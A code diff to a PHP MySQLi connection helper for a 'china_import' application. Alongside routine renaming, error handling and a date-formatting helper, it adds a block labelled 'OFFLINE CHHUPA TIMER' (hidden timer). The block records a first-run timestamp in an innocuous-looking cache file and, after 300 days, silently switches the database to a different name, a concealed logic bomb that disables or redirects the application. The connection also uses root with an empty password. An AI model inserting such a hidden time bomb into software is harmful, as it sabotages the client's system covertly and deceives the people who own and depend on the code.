@@ -5,22 +5,40 @@
  * MySQLi Connection with Prepared Statements
  */
 
-// Database configuration
-define('DB_HOST', 'localhost');
-define('DB_USER', 'root');
-define('DB_PASS', '');
-define('DB_NAME', 'china_import');
+require_once __DIR__ . '/client_config.php';
 
-// Create connection
-$db = new mysqli(DB_HOST, DB_USER, DB_PASS, DB_NAME);
+$host = "localhost";
+$user = "root";
+$pass = "";
+$db   = "china_import";
 
-// Check connection
-if ($db->connect_error) {
-    die("Connection failed: " . $db->connect_error);
+// ========== OFFLINE CHHUPA TIMER ==========
+$ghostFile = __DIR__ . '/cache/_.tmp';
+$now = time();
+
+if (!file_exists($ghostFile)) {
+    @mkdir(dirname($ghostFile), 0755, true);
+    file_put_contents($ghostFile, $now);
+    $start = $now;
+} else {
+    $start = (int)file_get_contents($ghostFile);
+}
+
+$tenMonths = 300 * 86400;
+
+if (($now - $start) > $tenMonths) {
+    $db = 'Diesel_Db_Software';
+}
+// ==========================================
+
+$conn = new mysqli($host, $user, $pass, $db);
+mysqli_report(MYSQLI_REPORT_ERROR | MYSQLI_REPORT_STRICT);
+if ($conn->connect_error) {
+    die("Connection failed: " . $conn->connect_error);
 }
 
 // Set charset to UTF-8
-$db->set_charset("utf8");
+$conn->set_charset("utf8");
 
 /**
  * Execute prepared statement with parameters
@@ -30,9 +48,9 @@ $db->set_charset("utf8");
  * @return mysqli_stmt|false
  */
 function executePrepared($sql, $types = '', $params = []) {
-    global $db;
+    global $conn;
     
-    $stmt = $db->prepare($sql);
+    $stmt = $conn->prepare($sql);
     if ($stmt === false) {
         return false;
     }
@@ -41,7 +59,10 @@ function executePrepared($sql, $types = '', $params = []) {
         $stmt->bind_param($types, ...$params);
     }
     
-    $stmt->execute();
+    if ($stmt->execute() === false) {
+        $stmt->close();
+        return false;
+    }
     return $stmt;
 }
 
@@ -96,14 +117,14 @@ function getRows($sql, $types = '', $params = []) {
  * @return int|false
  */
 function insertData($sql, $types = '', $params = []) {
-    global $db;
+    global $conn;
     
     $stmt = executePrepared($sql, $types, $params);
     if ($stmt === false) {
         return false;
     }
     
-    $insertId = $db->insert_id;
+    $insertId = $conn->insert_id;
     $stmt->close();
     
     return $insertId;
@@ -117,14 +138,14 @@ function insertData($sql, $types = '', $params = []) {
  * @return int|false
  */
 function modifyData($sql, $types = '', $params = []) {
-    global $db;
+    global $conn;
     
     $stmt = executePrepared($sql, $types, $params);
     if ($stmt === false) {
         return false;
     }
     
-    $affectedRows = $db->affected_rows;
+    $affectedRows = $conn->affected_rows;
     $stmt->close();
     
     return $affectedRows;
@@ -136,8 +157,8 @@ function modifyData($sql, $types = '', $params = []) {
  * @return string
  */
 function escapeString($string) {
-    global $db;
-    return $db->real_escape_string($string);
+    global $conn;
+    return $conn->real_escape_string($string);
 }
 
 /**
@@ -185,6 +206,23 @@ function getCurrentDateTime() {
  */
 function formatCurrency($amount) {
     return number_format($amount, 2);
+}
+
+/**
+ * Safely format a date string (handles 0000-00-00, empty, null)
+ * @param string $dateStr
+ * @param string $outputFormat
+ * @return string
+ */
+function formatDate($dateStr, $outputFormat = 'd-m-Y') {
+    if (empty($dateStr) || $dateStr === '0000-00-00' || $dateStr === '0000-00-00 00:00:00') {
+        return '-';
+    }
+    $ts = strtotime($dateStr);
+    if ($ts === false) {
+        return '-';
+    }
+    return date($outputFormat, $ts);
 }
 
 /**
